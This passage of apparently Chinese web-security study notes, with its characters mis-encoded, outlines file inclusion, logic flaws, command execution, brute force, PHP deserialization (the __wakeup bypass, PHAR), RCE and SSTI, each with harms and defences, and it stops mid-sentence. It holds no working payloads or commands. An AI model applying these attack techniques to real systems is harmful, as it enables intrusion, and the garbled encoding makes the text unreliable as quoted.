<h2 id="ä¸ƒã€æ–‡ä»¶åŒ…å«æ¼æ´ç¯‡"><a href="#ä¸ƒã€æ–‡ä»¶åŒ…å«æ¼æ´ç¯‡" class="headerlink" title="ä¸ƒã€æ–‡ä»¶åŒ…å«æ¼æ´ç¯‡"></a>ä¸ƒã€æ–‡ä»¶åŒ…å«æ¼æ´ç¯‡</h2><h3 id="1-æ–‡ä»¶åŒ…å«æ¼æ´åŸç†"><a href="#1-æ–‡ä»¶åŒ…å«æ¼æ´åŸç†" class="headerlink" title="1.æ–‡ä»¶åŒ…å«æ¼æ´åŸç†"></a>1.æ–‡ä»¶åŒ…å«æ¼æ´åŸç†</h3><p>å¼€å‘äººå‘˜å°†<u><strong>éœ€è¦é‡å¤è°ƒç”¨çš„å‡½æ•°å†™å…¥ä¸€ä¸ªæ–‡ä»¶ï¼Œå¯¹è¯¥æ–‡ä»¶è¿›è¡ŒåŒ…å«æ˜¯äº§ç”Ÿçš„æ“ä½œ</strong></u>ã€‚è¿™æ ·ç¼–å†™ä»£ç èƒ½å‡å°‘ä»£ç å†—ä½™ï¼Œé™ä½ä»£ç åæœŸç»´æŠ¤éš¾åº¦ï¼Œä¿è¯ç½‘ç«™æ•´ä½“é£æ ¼ç»Ÿä¸€ï¼šå¯¼èˆªæ ã€åº•éƒ¨footeræ ç­‰ã€‚<u><strong>æ–‡ä»¶åŒ…å«å‡½æ•°åŠ è½½çš„å‚æ•°æ²¡æœ‰ç»è¿‡è¿‡æ»¤æˆ–ä¸¥æ ¼å®šä¹‰ï¼Œå¯ä»¥è¢«ç”¨æˆ·æ§åˆ¶ï¼ŒåŒ…å«å…¶ä»–æ¶æ„æ–‡ä»¶ï¼Œå¯¼è‡´äº†æ‰§è¡Œéé¢„æœŸä»£ç </strong></u>ã€‚</p>
<h3 id="2-å±å®³-6"><a href="#2-å±å®³-6" class="headerlink" title="2.å±å®³"></a>2.å±å®³</h3><blockquote>
<p>â‘ è·å–æ•æ„Ÿä¿¡æ¯<br>â‘¡æ‰§è¡Œä»»æ„å‘½ä»¤<br>â‘¢è·å–æœåŠ¡å™¨æƒé™</p>
</blockquote>
<h3 id="3-é˜²å¾¡-6"><a href="#3-é˜²å¾¡-6" class="headerlink" title="3.é˜²å¾¡"></a>3.é˜²å¾¡</h3><blockquote>
<p>â‘ å»ºè®®ç™½åå•ã€‚<br>â‘¡æŒ‡å®šè®¿é—®ä¸€å®šçš„è·¯å¾„ï¼Œå†å°†å‚æ•°æ‹¼æ¥åˆ°è·¯å¾„å½“ä¸­ã€‚</p>
</blockquote>
<hr>
<h2 id="å…«ã€é€»è¾‘æ¼æ´æ¼æ´ç¯‡"><a href="#å…«ã€é€»è¾‘æ¼æ´æ¼æ´ç¯‡" class="headerlink" title="å…«ã€é€»è¾‘æ¼æ´æ¼æ´ç¯‡"></a>å…«ã€é€»è¾‘æ¼æ´æ¼æ´ç¯‡</h2><h3 id="1-é€»è¾‘æ¼æ´æ¼æ´åŸç†"><a href="#1-é€»è¾‘æ¼æ´æ¼æ´åŸç†" class="headerlink" title="1.é€»è¾‘æ¼æ´æ¼æ´åŸç†"></a>1.é€»è¾‘æ¼æ´æ¼æ´åŸç†</h3><p>æŒ‡æ”»å‡»è€…<u><strong>åˆ©ç”¨ä¸šåŠ¡çš„è®¾è®¡ç¼ºé™·ï¼Œè·å–æ•æ„Ÿä¿¡æ¯æˆ–ç ´åä¸šåŠ¡çš„å®Œæ•´æ€§</strong></u>ã€‚ä¸€èˆ¬å‡ºç°åœ¨<u><strong>å¯†ç ä¿®æ”¹ã€è¶Šæƒè®¿é—®ã€å¯†ç æ‰¾å›ã€äº¤æ˜“æ”¯ä»˜</strong></u>ç­‰åŠŸèƒ½å¤„ã€‚</p>
<h3 id="2-å±å®³-7"><a href="#2-å±å®³-7" class="headerlink" title="2.å±å®³"></a>2.å±å®³</h3><p>ä»»æ„å¯†ç ä¿®æ”¹ã€è¶Šæƒè®¿é—®ã€å¯†ç ä»»æ„æ‰¾å›ã€äº¤æ˜“æ”¯ä»˜é‡‘é¢ä»»æ„ä¿®æ”¹ç­‰</p>
<h3 id="3-é˜²å¾¡-7"><a href="#3-é˜²å¾¡-7" class="headerlink" title="3.é˜²å¾¡"></a>3.é˜²å¾¡</h3><h4 id="1-ä»»æ„å¯†ç ä¿®æ”¹"><a href="#1-ä»»æ„å¯†ç ä¿®æ”¹" class="headerlink" title="1.ä»»æ„å¯†ç ä¿®æ”¹"></a>1.ä»»æ„å¯†ç ä¿®æ”¹</h4><h4 id="2-è¶Šæƒè®¿é—®"><a href="#2-è¶Šæƒè®¿é—®" class="headerlink" title="2.è¶Šæƒè®¿é—®"></a>2.è¶Šæƒè®¿é—®</h4><p>è¶Šæƒè®¿é—®æ¼æ´äº§ç”Ÿ<u><strong>ä¸»è¦åŸå› æ˜¯æ²¡æœ‰å¯¹ç”¨æˆ·çš„èº«ä»½åšåˆ¤æ–­å’Œæ§åˆ¶</strong></u>ï¼Œé˜²èŒƒè¿™ç§æ¼æ´æ—¶ï¼Œå¯ä»¥é€šè¿‡sessionæ¥æ§åˆ¶ã€‚</p>
<p>ä¾‹å¦‚ï¼Œåœ¨ç”¨æˆ·ç™»å½•æ—¶ï¼Œå°†usernameæˆ–uidå†™å…¥åˆ°<code>session</code><u><strong><code>ï¼ˆä¼šè¯æ§åˆ¶ï¼ŒSessionå¯¹è±¡å­˜å‚¨ç‰¹å®šç”¨æˆ·ä¼šè¯æ‰€éœ€çš„å±æ€§åŠé…ç½®ä¿¡æ¯ã€‚è¿™æ ·ï¼Œå½“ç”¨æˆ·åœ¨åº”ç”¨ç¨‹åºçš„Webé¡µä¹‹é—´è·³è½¬æ—¶ï¼Œå­˜å‚¨åœ¨Sessionå¯¹è±¡ä¸­çš„å˜é‡å°†ä¸ä¼šä¸¢å¤±ï¼Œè€Œæ˜¯åœ¨æ•´ä¸ªç”¨æˆ·ä¼šè¯ä¸­ä¸€ç›´å­˜åœ¨ä¸‹å»ã€‚ï¼‰</code></strong></u>ä¸­å–å‡ºä¿¡æ¯ï¼Œ<u><strong><code>è€Œä¸æ˜¯ä»GETæˆ–POSTå–å‡ºusername</code></strong></u>ï¼Œnameæ­¤æ—¶å–åˆ°çš„usernameå°±æ˜¯æ²¡æœ‰ç¯¡æ”¹çš„ã€‚</p>
<hr>
<h2 id="ä¹ã€å‘½ä»¤æ‰§è¡Œæ¼æ´ç¯‡"><a href="#ä¹ã€å‘½ä»¤æ‰§è¡Œæ¼æ´ç¯‡" class="headerlink" title="ä¹ã€å‘½ä»¤æ‰§è¡Œæ¼æ´ç¯‡"></a>ä¹ã€å‘½ä»¤æ‰§è¡Œæ¼æ´ç¯‡</h2><h3 id="1-å‘½ä»¤æ‰§è¡Œæ¼æ´åŸç†"><a href="#1-å‘½ä»¤æ‰§è¡Œæ¼æ´åŸç†" class="headerlink" title="1.å‘½ä»¤æ‰§è¡Œæ¼æ´åŸç†"></a>1.å‘½ä»¤æ‰§è¡Œæ¼æ´åŸç†</h3><p>åº”ç”¨æœªå¯¹ç”¨æˆ·è¾“å…¥åšä¸¥æ ¼çš„æ£€æŸ¥è¿‡æ»¤ï¼Œå¯¼è‡´ç”¨æˆ·<u><strong>è¾“å…¥çš„å‚æ•°è¢«å½“æˆå‘½ä»¤æ¥æ‰§è¡Œ</strong></u>ã€‚æ”»å‡»è€…å¯ä»¥ä»»æ„æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œå±äºé«˜å±æ¼æ´ä¹‹ä¸€ï¼Œä¹Ÿå±äºä»£ç æ‰§è¡Œçš„èŒƒç•´ã€‚</p>
<h3 id="2-å±å®³-8"><a href="#2-å±å®³-8" class="headerlink" title="2.å±å®³"></a>2.å±å®³</h3><blockquote>
<p>â‘ ç»§æ‰¿webæœåŠ¡ç¨‹åºçš„æƒé™å»æ‰§è¡Œç³»ç»Ÿå‘½ä»¤æˆ–è¯»å†™æ–‡ä»¶ã€‚<br>â‘¡åå¼¹shellï¼Œè·å¾—ç›®æ ‡æœåŠ¡å™¨çš„æƒé™ã€‚<br>â‘¢è¿›ä¸€æ­¥å†…ç½‘æ¸—é€ã€‚</p>
</blockquote>
<h3 id="3-é˜²å¾¡-8"><a href="#3-é˜²å¾¡-8" class="headerlink" title="3.é˜²å¾¡"></a>3.é˜²å¾¡</h3><blockquote>
<p>â‘ å°½é‡ä¸è¦ä½¿ç”¨å‘½ä»¤æ‰§è¡Œå‡½æ•°ã€‚<br>â‘¡å®¢æˆ·ç«¯<u><strong>æäº¤çš„å˜é‡åœ¨è¿›å…¥æ‰§è¡Œå‘½ä»¤å‡½æ•°å‰</strong></u>è¦åšå¥½<u><strong>è¿‡æ»¤å’Œæ£€æµ‹</strong></u>ã€‚<br>â‘¢åœ¨<u><strong>ä½¿ç”¨åŠ¨æ€å‡½æ•°ä¹‹å‰</strong></u>ï¼Œç¡®ä¿ä½¿ç”¨å‡½æ•°æ˜¯<u><strong>æŒ‡å®šçš„å‡½æ•°</strong></u>ä¹‹ä¸€ã€‚<u><strong>ã€é˜²æ­¢æ”»å‡»è€…å¼•å…¥æ–°å‡½æ•°ï¼ˆéç½‘ç«™ä½¿ç”¨çš„å‡½æ•°ï¼‰æ‰§è¡Œæ”»å‡»è¯­å¥ã€‘</strong></u><br>â‘£å¯¹<u><strong>phpè¯­è¨€</strong></u>è€Œè¨€ï¼Œ<u><strong>ä¸èƒ½å®Œå…¨æ§åˆ¶çš„å±é™©å‡½æ•°æœ€å¥½ä¸è¦ä½¿ç”¨</strong></u>ã€‚</p>
</blockquote>
<hr>
<h2 id="åã€æš´åŠ›ç ´è§£ç¯‡"><a href="#åã€æš´åŠ›ç ´è§£ç¯‡" class="headerlink" title="åã€æš´åŠ›ç ´è§£ç¯‡"></a>åã€æš´åŠ›ç ´è§£ç¯‡</h2><h3 id="1-æš´åŠ›ç ´è§£åŸç†"><a href="#1-æš´åŠ›ç ´è§£åŸç†" class="headerlink" title="1.æš´åŠ›ç ´è§£åŸç†"></a>1.æš´åŠ›ç ´è§£åŸç†</h3><p>ç”±äºæœåŠ¡å™¨ç«¯æ²¡æœ‰åšé™åˆ¶ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥é€šè¿‡æš´åŠ›æ‰‹æ®µç ´è§£æ‰€éœ€ä¿¡æ¯ï¼Œå¦‚ç”¨æˆ·åã€å¯†ç ã€éªŒè¯ç ç­‰ã€‚æš´åŠ›ç ´è§£éœ€è¦ä¸€ä¸ªå¼ºå¤§çš„å­—å…¸ï¼Œå¦‚4ä½æ•°å­—çš„éªŒè¯ç ï¼Œé‚£ä¹ˆæš´åŠ›ç ´è§£çš„èŒƒå›´å°±æ˜¯0000~9999ï¼Œ<u><strong>æš´åŠ›ç ´è§£çš„å…³é”®åœ¨äºå­—å…¸çš„å¤§å°</strong></u>ã€‚</p>
<h3 id="2-å±å®³-9"><a href="#2-å±å®³-9" class="headerlink" title="2.å±å®³"></a>2.å±å®³</h3><blockquote>
<p>â‘ ç”¨æˆ·å¯†ç è¢«é‡ç½®ã€‚<br>â‘¡æ•æ„Ÿç›®å½•ã€å‚æ•°è¢«æšä¸¾ã€‚<br>â‘¢ç”¨æˆ·è®¢å•è¢«æšä¸¾ã€‚</p>
</blockquote>
<h3 id="3-é˜²å¾¡-9"><a href="#3-é˜²å¾¡-9" class="headerlink" title="3.é˜²å¾¡"></a>3.é˜²å¾¡</h3><blockquote>
<p>â‘  å¦‚æœ<u><strong>ç”¨æˆ·ç™»å½•æ¬¡æ•°è¶…è¿‡è®¾ç½®çš„é˜ˆå€¼</strong></u>ï¼Œåˆ™<u><strong>é”å®šè´¦å·</strong></u>ã€‚<br>â‘¡ å¦‚æœ<u><strong>æŸä¸ªIPç™»é™†æ¬¡æ•°è¶…è¿‡è®¾ç½®çš„é˜ˆå€¼ï¼Œåˆ™é”å®šIP</strong></u>ã€‚ä½†<u><em><strong>å­˜åœ¨ä¸€ä¸ªé—®é¢˜</strong></em></u>ï¼Œå¦‚æœ<u><strong>å¤šä¸ªç”¨æˆ·ä½¿ç”¨çš„æ˜¯åŒä¸€ä¸ªIPï¼Œåˆ™ä¼šé€ æˆå…¶ä»–ç”¨æˆ·ä¹Ÿä¸èƒ½ç™»å½•ã€‚</strong></u></p>
</blockquote>
<hr>
<h2 id="åä¸€ã€Deserialization-Vulnerabilitiesï¼ˆPHPï¼‰"><a href="#åä¸€ã€Deserialization-Vulnerabilitiesï¼ˆPHPï¼‰" class="headerlink" title="åä¸€ã€Deserialization Vulnerabilitiesï¼ˆPHPï¼‰"></a>åä¸€ã€Deserialization Vulnerabilitiesï¼ˆPHPï¼‰</h2><h3 id="1-Deserialization-Vulnerabilitiesæ¼æ´åŸç†"><a href="#1-Deserialization-Vulnerabilitiesæ¼æ´åŸç†" class="headerlink" title="1.Deserialization Vulnerabilitiesæ¼æ´åŸç†"></a>1.Deserialization Vulnerabilitiesæ¼æ´åŸç†</h3><p>PHPååºåˆ—åŒ–æ¼æ´ä¹Ÿå«PHPå¯¹è±¡æ³¨å…¥ï¼Œæ˜¯ä¸€ä¸ªéå¸¸å¸¸è§çš„æ¼æ´ï¼Œè¿™ç§ç±»å‹çš„æ¼æ´è™½ç„¶æœ‰äº›éš¾ä»¥åˆ©ç”¨ï¼Œä½†ä¸€æ—¦åˆ©ç”¨æˆåŠŸå°±ä¼šé€ æˆéå¸¸å±é™©çš„åæœã€‚</p>
<p>æ¼æ´çš„å½¢æˆçš„<u><strong>æ ¹æœ¬åŸå› æ˜¯ç¨‹åºæ²¡æœ‰å¯¹ç”¨æˆ·è¾“å…¥çš„ååºåˆ—åŒ–å­—ç¬¦ä¸²è¿›è¡Œæ£€æµ‹ï¼Œå¯¼è‡´ååºåˆ—åŒ–è¿‡ç¨‹å¯ä»¥è¢«æ¶æ„æ§åˆ¶ï¼Œè¿›è€Œé€ æˆä»£ç æ‰§è¡Œã€getshellç­‰ä¸€ç³»åˆ—ä¸å¯æ§çš„åæœ</strong></u>ã€‚ååºåˆ—åŒ–æ¼æ´å¹¶ä¸æ˜¯PHPç‰¹æœ‰ï¼Œ<u><strong>ä¹Ÿå­˜åœ¨äºJavaã€Pythonç­‰è¯­è¨€</strong></u>ä¹‹ä¸­ï¼Œä½†å…¶åŸç†åŸºæœ¬ç›¸é€šã€‚</p>
<p>PHPç±»éƒ½å«æœ‰å‡ ä¸ªç‰¹å®šçš„å…ƒç´ : ç±»å±æ€§ã€ç±»å¸¸é‡ã€ç±»æ–¹æ³•ã€‚æ¯ä¸€ä¸ªç±»è‡³å°‘éƒ½å«æœ‰ä»¥ä¸Šä¸‰ä¸ªå…ƒç´ ï¼Œè€Œè¿™ä¸‰ä¸ªå…ƒç´ ä¹Ÿå¯ä»¥ç»„æˆæœ€åŸºæœ¬çš„ç±»ã€‚é‚£ä¹ˆæŒ‰ç…§ç‰¹å®šçš„æ ¼å¼å°†è¿™ä¸‰ä¸ªå…ƒç´ è¡¨è¾¾å‡ºæ¥å°±å¯ä»¥å°†ä¸€ä¸ªå®Œæ•´çš„ç±»è¡¨ç¤ºå‡ºæ¥å¹¶ä¼ é€’ã€‚</p>
<p><u>åºåˆ—åŒ–å°±æ˜¯å°†ä¸€ä¸ª<strong>ç±»</strong>å‹ç¼©æˆä¸€ä¸ªå­—ç¬¦ä¸²çš„æ–¹æ³•</u></p>
<h3 id="2-å±å®³-10"><a href="#2-å±å®³-10" class="headerlink" title="2.å±å®³"></a>2.å±å®³</h3><p><u><strong>æœªå¯¹ç”¨æˆ·è¾“å…¥çš„åºåˆ—åŒ–å­—ç¬¦ä¸²è¿›è¡Œæ£€æµ‹</strong></u>ï¼Œå¯¼è‡´<u><strong>æ”»å‡»è€…å¯ä»¥æ§åˆ¶ååºåˆ—åŒ–è¿‡ç¨‹</strong></u>ï¼Œä»è€Œ<u><strong>å¯¼è‡´ä»£ç æ‰§è¡Œï¼ŒSQLæ³¨å…¥ï¼Œç›®å½•éå†ç­‰ä¸å¯æ§åæœ</strong></u>ã€‚åœ¨ååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­è‡ªåŠ¨è§¦å‘äº†æŸäº›é­”æœ¯æ–¹æ³•ã€‚</p>
<h3 id="3-é˜²å¾¡-10"><a href="#3-é˜²å¾¡-10" class="headerlink" title="3.é˜²å¾¡"></a>3.é˜²å¾¡</h3><h4 id="1-ç­¾åä¸è®¤è¯"><a href="#1-ç­¾åä¸è®¤è¯" class="headerlink" title="1)ç­¾åä¸è®¤è¯"></a>1)ç­¾åä¸è®¤è¯</h4><p>å¦‚æœåºåˆ—åŒ–çš„å†…å®¹æ²¡æœ‰ç”¨æˆ·å¯æ§å‚æ•°ï¼Œä»…ä»…æ˜¯æœåŠ¡ç«¯å­˜å‚¨å’Œåº”ç”¨ï¼Œåˆ™å¯ä»¥é€šè¿‡ç­¾åè®¤è¯ï¼Œæ¥é¿å…åº”ç”¨æ¥å—é»‘å®¢çš„å¼‚å¸¸è¾“å…¥ã€‚   </p>
<h4 id="2-é™åˆ¶åºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„ç±»"><a href="#2-é™åˆ¶åºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„ç±»" class="headerlink" title="2)é™åˆ¶åºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„ç±»"></a>2)é™åˆ¶åºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„ç±»</h4><p>å¢åŠ ä¸€å±‚åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ¥å£ç±»ã€‚è¿™å°±ç›¸å½“äºå…è®¸æä¾›äº†ä¸€ä¸ªç™½åå•çš„è¿‡æ»¤ï¼šåªå…è®¸æŸäº›ç±»å¯ä»¥è¢«ååºåˆ—åŒ–ã€‚åªè¦ä½ åœ¨ååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­ï¼Œé¿å…æ¥å—å¤„ç†ä»»ä½•ç±»å‹ï¼ˆåŒ…æ‹¬ç±»æˆå‘˜ä¸­çš„æ¥å£ã€æ³›å‹ç­‰ï¼‰ï¼Œé»‘å®¢å…¶å®å¾ˆéš¾æ§åˆ¶åº”ç”¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­æ‰€ä½¿ç”¨çš„ç±»ï¼Œä¹Ÿå°±æ²¡æœ‰åŠæ³•æ„é€ å‡ºè°ƒç”¨é“¾ï¼Œè‡ªç„¶ä¹Ÿå°±å¾ˆéš¾åˆ©ç”¨ååºåˆ—åŒ–æ¼æ´äº†</p>
<h4 id="3-RASPæ£€æµ‹"><a href="#3-RASPæ£€æµ‹" class="headerlink" title="3)RASPæ£€æµ‹"></a>3)RASPæ£€æµ‹</h4><p>ï¼ˆ<code>Runtime Application Self-Protection</code>ï¼Œå®æ—¶ç¨‹åºè‡ªæˆ‘ä¿æŠ¤ï¼‰ã€‚RASP é€šè¿‡ hook ç­‰æ–¹å¼ï¼Œåœ¨è¿™äº›å…³é”®å‡½æ•°ï¼ˆä¾‹å¦‚ï¼šåºåˆ—åŒ–ï¼Œååºåˆ—åŒ–)çš„è°ƒç”¨ä¸­ï¼Œå¢åŠ ä¸€é“è§„åˆ™çš„æ£€æµ‹ã€‚è¿™ä¸ªè§„åˆ™ä¼šåˆ¤æ–­åº”ç”¨æ˜¯å¦æ‰§è¡Œäº†éåº”ç”¨æœ¬èº«çš„é€»è¾‘ï¼Œèƒ½å¤Ÿåœ¨ä¸ä¿®æ”¹ä»£ç çš„æƒ…å†µä¸‹å¯¹ååºåˆ—åŒ–æ¼æ´æ”»å‡»å®ç°æ‹¦æˆª.</p>
<h3 id="4-åˆ©ç”¨"><a href="#4-åˆ©ç”¨" class="headerlink" title="4.åˆ©ç”¨"></a>4.åˆ©ç”¨</h3><h4 id="1-wakeup-ç»•è¿‡"><a href="#1-wakeup-ç»•è¿‡" class="headerlink" title="1)__wakeup( )ç»•è¿‡"></a>1)__wakeup( )ç»•è¿‡</h4><p><code>(CVE-2016-7124)</code></p>
<p>ååºåˆ—åŒ–æ—¶ï¼Œå¦‚æœè¡¨ç¤ºå¯¹è±¡<code>å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°</code>æ—¶å°±ä¼š<code>è·³è¿‡__wakeup( )çš„æ‰§è¡Œ</code>ã€‚</p>
<h4 id="2-æ³¨å…¥å¯¹è±¡æ„é€ æ–¹æ³•"><a href="#2-æ³¨å…¥å¯¹è±¡æ„é€ æ–¹æ³•" class="headerlink" title="2)æ³¨å…¥å¯¹è±¡æ„é€ æ–¹æ³•"></a>2)æ³¨å…¥å¯¹è±¡æ„é€ æ–¹æ³•</h4><p>å½“ç›®æ ‡å¯¹è±¡è¢«<code>privateã€protectedä¿®é¥°æ—¶çš„æ„é€ æ–¹æ³•</code>ã€‚</p>
<h4 id="3-Sessionååºåˆ—åŒ–æ¼æ´"><a href="#3-Sessionååºåˆ—åŒ–æ¼æ´" class="headerlink" title="3)Sessionååºåˆ—åŒ–æ¼æ´"></a>3)Sessionååºåˆ—åŒ–æ¼æ´</h4><p>PHPä¸­çš„<code>Sessionç»åºåˆ—åŒ–åå­˜å‚¨ï¼Œè¯»å–æ—¶å†è¿›è¡Œååºåˆ—åŒ–</code>ã€‚</p>
<h4 id="4-PHARåˆ©ç”¨"><a href="#4-PHARåˆ©ç”¨" class="headerlink" title="4)PHARåˆ©ç”¨"></a>4)PHARåˆ©ç”¨</h4><p>PHAR (â€œPhp ARchiveâ€) æ˜¯PHPé‡Œç±»ä¼¼äºJARçš„ä¸€ç§æ‰“åŒ…æ–‡ä»¶ï¼Œåœ¨PHP 5.3 æˆ–æ›´é«˜ç‰ˆæœ¬ä¸­é»˜è®¤å¼€å¯ï¼Œè¿™ä¸ªç‰¹æ€§ä½¿å¾— PHPä¹Ÿå¯ä»¥åƒ Java ä¸€æ ·æ–¹ä¾¿åœ°å®ç°åº”ç”¨ç¨‹åºæ‰“åŒ…å’Œç»„ä»¶åŒ–ã€‚ä¸€ä¸ªåº”ç”¨ç¨‹åºå¯ä»¥æ‰“æˆä¸€ä¸ª Phar åŒ…ï¼Œç›´æ¥æ”¾åˆ° PHP-FPM ä¸­è¿è¡Œã€‚</p>
<hr>
<h2 id="åäºŒã€rceæ¼æ´ç¯‡"><a href="#åäºŒã€rceæ¼æ´ç¯‡" class="headerlink" title="åäºŒã€rceæ¼æ´ç¯‡"></a>åäºŒã€rceæ¼æ´ç¯‡</h2><h3 id="1-rceæ¼æ´åŸç†"><a href="#1-rceæ¼æ´åŸç†" class="headerlink" title="1.rceæ¼æ´åŸç†"></a>1.rceæ¼æ´åŸç†</h3><p>ä¸€èˆ¬å‡ºç°è¿™ç§æ¼æ´ï¼Œæ˜¯å› ä¸ºåº”ç”¨ç³»ç»Ÿ<u><strong>ä»è®¾è®¡ä¸Šéœ€è¦ç»™ç”¨æˆ·æä¾›æŒ‡å®šçš„è¿œç¨‹å‘½ä»¤æ“ä½œçš„æ¥å£</strong></u>ã€‚æ¯”å¦‚æˆ‘ä»¬å¸¸è§çš„è·¯ç”±å™¨ã€é˜²ç«å¢™ã€å…¥ä¾µæ£€æµ‹ç­‰è®¾å¤‡çš„webç®¡ç†ç•Œé¢ä¸Šã€‚ä¸€èˆ¬ä¼šç»™ç”¨æˆ·æä¾›ä¸€ä¸ªpingæ“ä½œçš„webç•Œé¢ï¼Œç”¨æˆ·ä»webç•Œé¢è¾“å…¥ç›®æ ‡IPï¼Œæäº¤åï¼Œåå°ä¼šå¯¹è¯¥IPåœ°å€è¿›è¡Œä¸€æ¬¡pingæµ‹è¯•ï¼Œå¹¶è¿”å›æµ‹è¯•ç»“æœã€‚ å¦‚æœï¼Œè®¾è®¡è€…åœ¨å®Œæˆè¯¥åŠŸèƒ½æ—¶ï¼Œ<u><strong>æ²¡æœ‰åšä¸¥æ ¼çš„å®‰å…¨æ§åˆ¶ï¼Œåˆ™å¯èƒ½ä¼š<code>å¯¼è‡´æ”»å‡»è€…é€šè¿‡è¯¥æ¥å£æäº¤â€œæ„æƒ³ä¸åˆ°â€çš„å‘½ä»¤</code>ï¼Œä»è€Œè®©åå°è¿›è¡Œæ‰§è¡Œï¼Œä»è€Œæ§åˆ¶æ•´ä¸ªåå°æœåŠ¡å™¨</strong></u>ã€‚ ç°åœ¨å¾ˆå¤šçš„ä¼ä¸šéƒ½å¼€å§‹å®æ–½è‡ªåŠ¨åŒ–è¿ç»´,å¤§é‡çš„ç³»ç»Ÿæ“ä½œä¼šé€šè¿‡â€è‡ªåŠ¨åŒ–è¿ç»´å¹³å°â€è¿›è¡Œæ“ä½œã€‚åœ¨è¿™ç§å¹³å°ä¸Šå¾€å¾€ä¼šå‡ºç°è¿œç¨‹ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œçš„æ¼æ´ã€‚ è¿œç¨‹ä»£ç æ‰§è¡Œ åŒæ ·çš„é“ç†,å› ä¸ºéœ€æ±‚è®¾è®¡,åå°æœ‰æ—¶å€™ä¹Ÿä¼šæŠŠç”¨æˆ·çš„è¾“å…¥ä½œä¸ºä»£ç çš„ä¸€éƒ¨åˆ†è¿›è¡Œæ‰§è¡Œ,ä¹Ÿå°±é€ æˆäº†è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚ ä¸ç®¡æ˜¯ä½¿ç”¨äº†ä»£ç æ‰§è¡Œçš„å‡½æ•°,è¿˜æ˜¯ä½¿ç”¨äº†ä¸å®‰å…¨çš„ååºåˆ—åŒ–ç­‰ç­‰ã€‚ </p>
<blockquote>
<p>å› æ­¤ï¼Œå¦‚æœéœ€è¦ç»™<u><strong>å‰ç«¯ç”¨æˆ·æä¾›æ“ä½œç±»çš„APIæ¥å£ï¼ˆä¸€èˆ¬æŒ‡åº”ç”¨ç¨‹åºçš„ç¼–ç¨‹æ¥å£ï¼Œä¸»è¦ç›®çš„æ˜¯æä¾›åº”ç”¨ç¨‹åºä¸å¼€å‘äººå‘˜ä»¥è®¿é—®ä¸€ç»„ä¾‹ç¨‹çš„èƒ½åŠ›ï¼Œè€Œåˆæ— éœ€è®¿é—®æºç ï¼Œæˆ–ç†è§£å†…éƒ¨å·¥ä½œæœºåˆ¶çš„ç»†èŠ‚ï¼‰ï¼Œä¸€å®šéœ€è¦å¯¹æ¥å£è¾“å…¥çš„å†…å®¹è¿›è¡Œä¸¥æ ¼çš„åˆ¤æ–­</strong></u>ï¼Œæ¯”å¦‚<code>å®æ–½ä¸¥æ ¼çš„ç™½åå•ç­–ç•¥</code>ä¼šæ˜¯ä¸€ä¸ªæ¯”è¾ƒå¥½çš„æ–¹æ³•ã€‚</p>
</blockquote>
<h3 id="2-å±å®³-11"><a href="#2-å±å®³-11" class="headerlink" title="2.å±å®³"></a>2.å±å®³</h3><p>RCEæ¼æ´ï¼Œå¯ä»¥è®©æ”»å‡»è€…ç›´æ¥å‘åå°æœåŠ¡å™¨è¿œç¨‹æ³¨å…¥<u><strong>æ“ä½œç³»ç»Ÿå‘½ä»¤æˆ–è€…ä»£ç </strong></u>ï¼Œä»è€Œæ§åˆ¶åå°ç³»ç»Ÿã€‚</p>
<h3 id="3-é˜²å¾¡-11"><a href="#3-é˜²å¾¡-11" class="headerlink" title="3.é˜²å¾¡"></a>3.é˜²å¾¡</h3><blockquote>
<p>1)å°½é‡ä¸è¦ä½¿ç”¨å‘½ä»¤æ‰§è¡Œå‡½æ•°ã€‚</p>
<p>2)ä¸è¦è®©ç”¨æˆ·æ§åˆ¶å‚æ•°ã€‚</p>
<p>3)æ‰§è¡Œå‰åšå¥½æ£€æµ‹å’Œè¿‡æ»¤ã€‚</p>
</blockquote>
<h2 id="åä¸‰ã€sstiæ¼æ´ç¯‡"><a href="#åä¸‰ã€sstiæ¼æ´ç¯‡" class="headerlink" title="åä¸‰ã€sstiæ¼æ´ç¯‡"></a>åä¸‰ã€sstiæ¼æ´ç¯‡</h2><h3 id="1-sstiæ¼æ´åŸç†"><a href="#1-sstiæ¼æ´åŸç†" class="headerlink" title="1.sstiæ¼æ´åŸç†"></a>1.sstiæ¼æ´åŸç†</h3><p><a href="https://xz.aliyun.com/t/3679#toc-0">æ¨èæ–‡ç« </a></p>
<p>SSTIæ˜¯ä¸€ç§æ³¨å…¥ç±»çš„æ¼æ´ï¼Œå…¶<code>æˆå› ä¹Ÿå¯ä»¥ç±»æ¯”SQLæ³¨å…¥</code><br>SQLæ³¨å…¥æ˜¯ä»ç”¨æˆ·è·å¾—ä¸€ä¸ªè¾“å…¥ï¼Œç„¶åç”¨åç«¯è„šæœ¬è¯­è¨€è¿›è¡Œæ•°æ®åº“æŸ¥è¯¢ï¼Œåˆ©ç”¨è¾“å…¥æ¥æ‹¼æ¥æˆ‘ä»¬æƒ³è¦çš„SQLè¯­å¥ã€‚SSTIä¹Ÿæ˜¯è·å–ä¸€ä¸ªè¾“å…¥ï¼Œç„¶ååœ¨åç«¯çš„æ¸²æŸ“å¤„ç†ä¸Šè¿›è¡Œè¯­å¥çš„æ‹¼æ¥æ‰§è¡Œã€‚ä½†æ˜¯å’ŒSQLæ³¨å…¥ä¸åŒçš„ï¼Œ</p>
